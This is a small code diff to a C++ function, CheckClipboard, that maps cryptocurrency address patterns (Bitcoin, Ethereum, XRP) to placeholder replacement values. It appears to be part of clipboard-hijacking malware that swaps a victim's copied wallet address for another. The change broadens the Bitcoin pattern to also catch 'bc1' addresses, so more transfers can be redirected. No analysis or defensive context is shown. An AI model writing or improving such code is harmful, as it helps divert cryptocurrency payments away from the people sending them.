@@ -39,7 +39,7 @@ void CheckClipboard() {
 
     // Define a mapping between cryptocurrency addresses and default values
     std::unordered_map<std::string, std::string> addressDefaults = {
-        {"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", "BTC_ADDRESS"},
+        {"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$", "BTC_ADDRESS"},
         {"^0x[a-fA-F0-9]{40}$", "ETH_ADDRESS"},
         {"r[0-9a-zA-Z]{24,34}$", "XRP_ADDRESS"}
     };
